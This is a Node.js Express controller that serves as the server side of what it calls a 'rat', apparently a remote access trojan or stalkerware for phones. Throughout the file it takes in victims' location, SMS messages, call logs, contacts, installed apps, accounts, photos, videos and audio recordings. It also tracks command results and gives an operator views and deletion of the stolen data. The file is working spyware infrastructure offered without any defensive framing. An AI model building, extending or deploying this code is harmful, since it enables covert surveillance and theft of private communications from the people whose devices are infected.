const Location = require('../models/Location');
const Sms = require('../models/Sms');
const CallLog = require('../models/CallLog');
const Contact = require('../models/Contact');
const Photo = require('../models/Photo');
const Recording = require('../models/Recording');
const Device = require('../models/Device');
const Command = require('../models/Command');
const {
  uploadToCloudinary,
  deleteFromCloudinary,
  deleteCloudinaryFolder,
  extractPublicId,
} = require('../utils/cloudinary');

// @desc    Receive location data from device
// @route   POST /api/data/location
const receiveLocation = async (req, res) => {
  try {
    const { deviceId, latitude, longitude, accuracy, altitude, speed, bearing, provider, address } = req.body;

    const location = await Location.create({
      deviceId, latitude, longitude, accuracy,
      altitude, speed, bearing, provider, address,
    });

    res.json({ success: true, locationId: location._id });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

// @desc    Receive SMS logs from device
// @route   POST /api/data/sms
const receiveSms = async (req, res) => {
  try {
    const { deviceId, messages } = req.body;

    if (!Array.isArray(messages) || messages.length === 0) {
      return res.json({ success: true, count: 0 });
    }

    const operations = messages.map((msg) => ({
      updateOne: {
        filter: { deviceId, date: msg.date, address: msg.address, body: msg.body },
        update: {
          $setOnInsert: {
            deviceId,
            type: msg.type || 'inbox',
            address: msg.address,
            body: msg.body,
            date: msg.date,
            read: msg.read || false,
            serviceCenter: msg.serviceCenter || '',
          },
        },
        upsert: true,
      },
    }));

    await Sms.bulkWrite(operations);

    res.json({ success: true, count: messages.length });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

// @desc    Receive call logs from device
// @route   POST /api/data/calllogs
const receiveCallLogs = async (req, res) => {
  try {
    const { deviceId, callLogs } = req.body;

    if (!Array.isArray(callLogs) || callLogs.length === 0) {
      return res.json({ success: true, count: 0 });
    }

    const operations = callLogs.map((log) => ({
      updateOne: {
        filter: { deviceId, date: log.date, number: log.number, duration: log.duration },
        update: {
          $setOnInsert: {
            deviceId,
            type: log.type || 'incoming',
            number: log.number,
            name: log.name || '',
            duration: log.duration || 0,
            date: log.date,
          },
        },
        upsert: true,
      },
    }));

    await CallLog.bulkWrite(operations);

    res.json({ success: true, count: callLogs.length });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

// @desc    Receive contacts from device
// @route   POST /api/data/contacts
const receiveContacts = async (req, res) => {
  try {
    const { deviceId, contacts } = req.body;

    if (!Array.isArray(contacts) || contacts.length === 0) {
      return res.json({ success: true, count: 0 });
    }

    const operations = contacts.map((contact) => ({
      updateOne: {
        filter: { deviceId, rawContactId: contact.rawContactId || contact.number },
        update: {
          $setOnInsert: {
            deviceId,
            name: contact.name || '',
            number: contact.number || '',
            email: contact.email || '',
            photoUri: contact.photoUri || '',
            rawContactId: contact.rawContactId || contact.number,
          },
        },
        upsert: true,
      },
    }));

    await Contact.bulkWrite(operations);

    res.json({ success: true, count: contacts.length });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

// @desc    Receive installed apps list
// @route   POST /api/data/apps
const receiveApps = async (req, res) => {
  try {
    const { deviceId, apps } = req.body;

    if (!Array.isArray(apps)) {
      return res.json({ success: true, count: 0 });
    }

    await Device.findOneAndUpdate({ deviceId }, { installedApps: apps });

    res.json({ success: true, count: apps.length });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

// @desc    Receive accounts list
// @route   POST /api/data/accounts
const receiveAccounts = async (req, res) => {
  try {
    const { deviceId, accounts } = req.body;

    if (!Array.isArray(accounts)) {
      return res.json({ success: true, count: 0 });
    }

    await Device.findOneAndUpdate({ deviceId }, { accounts });

    res.json({ success: true, count: accounts.length });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

// @desc    Upload photo/video file to Cloudinary
// @route   POST /api/data/upload-media
const uploadMedia = async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ success: false, message: 'No file uploaded' });
    }

    const { deviceId, fileName, mimeType, isVideo, latitude, longitude } = req.body;

    // Determine Cloudinary folder: rat_photos/{deviceId}/
    const folder = `rat_photos/${deviceId}`;
    const resourceType = (isVideo === 'true' || isVideo === true) ? 'video' : 'image';

    // Upload to Cloudinary
    const result = await uploadToCloudinary(req.file.buffer, folder, fileName || req.file.originalname, {
      resource_type: resourceType,
    });

    const photo = await Photo.create({
      deviceId,
      fileName: fileName || req.file.originalname,
      filePath: result.secure_url,
      publicId: result.public_id,
      resourceType,
      fileSize: req.file.size,
      mimeType: mimeType || req.file.mimetype,
      isVideo: isVideo === 'true' || isVideo === true,
      latitude: latitude || 0,
      longitude: longitude || 0,
      isUploaded: true,
    });

    res.json({ success: true, photoId: photo._id });
  } catch (error) {
    console.error('Upload media error:', error.message);
    res.status(500).json({ success: false, message: 'Server error: ' + error.message });
  }
};

// @desc    Receive audio recording and upload to Cloudinary
// @route   POST /api/data/upload-recording
const uploadRecording = async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ success: false, message: 'No file uploaded' });
    }

    const { deviceId, fileName, duration, mimeType } = req.body;

    // Determine Cloudinary folder: rat_recordings/{deviceId}/
    const folder = `rat_recordings/${deviceId}`;

    // Upload to Cloudinary (audio as raw or video resource type)
    const result = await uploadToCloudinary(req.file.buffer, folder, fileName || req.file.originalname, {
      resource_type: 'video', // Cloudinary treats audio files as video type
    });

    const recording = await Recording.create({
      deviceId,
      fileName: fileName || req.file.originalname,
      filePath: result.secure_url,
      publicId: result.public_id,
      resourceType: 'video',
      fileSize: req.file.size,
      duration: duration || 0,
      mimeType: mimeType || req.file.mimetype,
      isUploaded: true,
    });

    res.json({ success: true, recordingId: recording._id });
  } catch (error) {
    console.error('Upload recording error:', error.message);
    res.status(500).json({ success: false, message: 'Server error: ' + error.message });
  }
};

// @desc    Update command status
// @route   POST /api/data/command-status
const updateCommandStatus = async (req, res) => {
  try {
    const { commandId, status, result } = req.body;

    const update = { status };
    if (status === 'completed' || status === 'failed') {
      update.completedAt = new Date();
    }
    if (result) {
      update.result = result;
    }

    await Command.findByIdAndUpdate(commandId, update);

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

// @desc    Get all data for a device (admin)
// @route   GET /api/data/:deviceId
const getDeviceData = async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { type, limit = 50, skip = 0 } = req.query;

    let data = {};
    const numLimit = parseInt(limit);
    const numSkip = parseInt(skip);

    if (!type || type === 'locations') {
      data.locations = await Location.find({ deviceId })
        .sort({ timestamp: -1 })
        .limit(numLimit)
        .skip(numSkip);
    }

    if (!type || type === 'sms') {
      data.sms = await Sms.find({ deviceId })
        .sort({ date: -1 })
        .limit(numLimit)
        .skip(numSkip);
    }

    if (!type || type === 'calllogs') {
      data.callLogs = await CallLog.find({ deviceId })
        .sort({ date: -1 })
        .limit(numLimit)
        .skip(numSkip);
    }

    if (!type || type === 'contacts') {
      data.contacts = await Contact.find({ deviceId })
        .sort({ name: 1 })
        .limit(numLimit)
        .skip(numSkip);
    }

    if (!type || type === 'photos') {
      data.photos = await Photo.find({ deviceId })
        .sort({ dateTaken: -1 })
        .limit(numLimit)
        .skip(numSkip);
    }

    if (!type || type === 'recordings') {
      data.recordings = await Recording.find({ deviceId })
        .sort({ timestamp: -1 })
        .limit(numLimit)
        .skip(numSkip);
    }

    if (!type || type === 'commands') {
      data.commands = await Command.find({ deviceId })
        .sort({ createdAt: -1 })
        .limit(20);
    }

    if (!type || type === 'accounts') {
      const device = await Device.findOne({ deviceId });
      data.accounts = device?.accounts || [];
    }

    if (!type || type === 'apps') {
      const device = await Device.findOne({ deviceId });
      data.apps = device?.installedApps || [];
    }

    res.json({ success: true, data });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

// @desc    Delete a single photo from Cloudinary and database (admin)
// @route   DELETE /api/data/photo/:photoId
const deletePhoto = async (req, res) => {
  try {
    const { photoId } = req.params;
    const photo = await Photo.findById(photoId);

    if (!photo) {
      return res.status(404).json({ success: false, message: 'Photo not found' });
    }

    // Delete from Cloudinary
    if (photo.publicId) {
      const result = await deleteFromCloudinary(photo.publicId, photo.resourceType || 'image');
      console.log('Cloudinary delete result:', result);
    } else if (photo.filePath) {
      // Fallback: try to extract public_id from URL
      const publicId = extractPublicId(photo.filePath, photo.resourceType || 'image');
      if (publicId) {
        await deleteFromCloudinary(publicId, photo.resourceType || 'image');
      }
    }

    // Delete from database
    await Photo.findByIdAndDelete(photoId);

    res.json({ success: true, message: 'Photo deleted successfully' });
  } catch (error) {
    console.error('Delete photo error:', error.message);
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

// @desc    Delete a single recording from Cloudinary and database (admin)
// @route   DELETE /api/data/recording/:recordingId
const deleteRecording = async (req, res) => {
  try {
    const { recordingId } = req.params;
    const recording = await Recording.findById(recordingId);

    if (!recording) {
      return res.status(404).json({ success: false, message: 'Recording not found' });
    }

    // Delete from Cloudinary
    if (recording.publicId) {
      const result = await deleteFromCloudinary(recording.publicId, recording.resourceType || 'video');
      console.log('Cloudinary delete result:', result);
    } else if (recording.filePath) {
      // Fallback: try to extract public_id from URL
      const publicId = extractPublicId(recording.filePath, recording.resourceType || 'video');
      if (publicId) {
        await deleteFromCloudinary(publicId, recording.resourceType || 'video');
      }
    }

    // Delete from database
    await Recording.findByIdAndDelete(recordingId);

    res.json({ success: true, message: 'Recording deleted successfully' });
  } catch (error) {
    console.error('Delete recording error:', error.message);
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

module.exports = {
  receiveLocation,
  receiveSms,
  receiveCallLogs,
  receiveContacts,
  receiveApps,
  receiveAccounts,
  uploadMedia,
  uploadRecording,
  updateCommandStatus,
  getDeviceData,
  deletePhoto,
  deleteRecording,
};